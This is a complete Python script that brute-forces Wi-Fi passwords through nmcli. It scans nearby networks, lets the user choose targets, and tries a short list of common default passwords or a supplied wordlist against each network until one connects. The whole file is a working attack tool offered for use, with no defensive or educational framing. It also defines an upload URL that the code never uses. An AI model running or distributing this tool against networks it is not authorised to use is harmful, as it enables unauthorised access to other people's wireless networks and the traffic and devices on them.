import os
import subprocess
import time
import requests

ASCII_ART = r"""
⠤⠤⠤⠤⠤⠤⢤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠤⠶⠶⠶⠦⠤⠤⠤⠤⠤⢤⣤⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠄⢂⣠⣭⣭⣕⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠀⠀⠀⠤⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉
⠀⠀⢀⠜⣳⣾⡿⠛⣿⣿⣿⣦⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣍⣀⣦⠦⠄⣀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⣄⣽⣿⠋⠀⡰⢿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡿⠛⠛⡿⠿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣁⣂⣤⡄⠀⠀⠀⠀⠀⠀
⢳⣶⣼⣿⠃⠀⢀⠧⠤⢜⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠀⡇⠀⣀⡈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠁⠐⠀⣀⠀⠀
⠀⠙⠻⣿⠀⠀⠀⠀⠀⠀⢹⣿⣿⡝⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡿⠋⠀⠀⠀⠀⠠⠃⠁⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⡿⠋⠀⠀
⠀⠀⠀⠙⡄⠀⠀⠀⠀⠀⢸⣿⣿⡃⢼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡏⠉⠉⠻⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⢰⠀⠀⠰⡒⠊⠻⠿⠋⠐⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣇⡀⠀⠑⢄⠀⠀⠀⡠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢖⠠⠤⠤⠔⠙⠻⠿⠋⠱⡑⢄⠀⢠⠟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠉⠒⠒⠻⠶⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠡⢀⡵⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠦⣀⠀⠀⠀⠀⠀⢀⣤⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠙⠛⠓⠒⠲⠿⢍⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

DEFAULT_WORDS = [
    "11111111", "12345678", "87654321",
    "00000000", "888888us", "88888888", "888888eu"
]
UPLOAD_URL = "http://192.168.4.1/upload"
MAX_ATTEMPTS_PER_SSID = 10

wifi_interface = None

def show_ascii():
    os.system("clear")
    print(ASCII_ART)

def select_interface():
    global wifi_interface
    print("[*] Scanning for available Wi-Fi interfaces...\n")
    result = subprocess.check_output(["nmcli", "device", "status"]).decode()
    interfaces = []
    for line in result.strip().split("\n")[1:]:
        parts = line.split()
        if len(parts) >= 3 and parts[1] == "wifi":
            interfaces.append(parts[0])

    if not interfaces:
        print("[-] No Wi-Fi interfaces found.")
        exit(1)

    print("[*] Interfaces found:")
    for i, iface in enumerate(interfaces):
        print(f"{i}. {iface}")

    idx = int(input("\nSelect interface number: "))
    wifi_interface = interfaces[idx]

def scan_wifi():
    print(f"\n[*] Scanning Wi-Fi networks via {wifi_interface}...")
    out = subprocess.check_output(["nmcli", "-f", "SSID", "dev", "wifi", "list", "ifname", wifi_interface]).decode()
    ssids = list(set(filter(None, [line.strip() for line in out.splitlines()[1:]])))
    return ssids

def select_targets(ssids):
    print("\n[*] Networks found:")
    for i, s in enumerate(ssids):
        print(f"{i}. {s}")
    selected = input("\nSelect target numbers separated by comma: ").split(",")
    return [ssids[int(i)] for i in selected]

def get_wordlist():
    choice = input("\nUse custom wordlist? (y/n): ").lower()
    if choice == "y":
        path = input("Path to wordlist: ").strip()
        if not os.path.exists(path):
            print("[-] File not found.")
            exit(1)
        with open(path) as f:
            return [line.strip() for line in f if line.strip()]
    return DEFAULT_WORDS

def brute(ssid, passwords, max_attempts=MAX_ATTEMPTS_PER_SSID, timeout=10):
    attempts = 0
    for pwd in passwords:
        if attempts >= max_attempts:
            print(f"[-] Max attempts exceeded for {ssid}.")
            break

        subprocess.run(["nmcli", "connection", "delete", ssid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"[*] Trying {pwd} for {ssid}...")
        try:
            res = subprocess.run(
                ["nmcli", "dev", "wifi", "connect", ssid, "password", pwd, "ifname", wifi_interface],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout
            )
        except subprocess.TimeoutExpired:
            print(f"[-] Connection to {ssid} with password {pwd} timed out after {timeout}s.")
            attempts += 1
            continue

        if "successfully activated" in res.stdout.lower():
            print(f"[✓] Password found for '{ssid}': {pwd}\n")
            return pwd

        if "802-11-wireless-security.key-mgmt: property is missing" in res.stderr:
            print(f"[*] {ssid} might be open. Trying connection without password...")

            subprocess.run(["nmcli", "connection", "delete", ssid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            try:
                res2 = subprocess.run(
                    ["nmcli", "dev", "wifi", "connect", ssid, "ifname", wifi_interface],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout
                )
            except subprocess.TimeoutExpired:
                print(f"[-] Connection to {ssid} without password timed out after {timeout}s.")
                attempts += 1
                continue

            if "successfully activated" in res2.stdout.lower():
                print(f"[✓] Successfully connected to open network '{ssid}' without password.\n")
                return ""

        print(f"stderr: {res.stderr.strip()}")
        attempts += 1

    print(f"[-] Password not found for {ssid}")
    return None

def main():
    show_ascii()
    select_interface()
    ssids = scan_wifi()
    targets = select_targets(ssids)
    passwords = get_wordlist()

    for ssid in targets:
        pwd = brute(ssid, passwords)
        if pwd is not None:
            print("[*] Connected or open network.")
        else:
            print("[*] Password not found, moving to next target.")

if __name__ == "__main__":
    main()

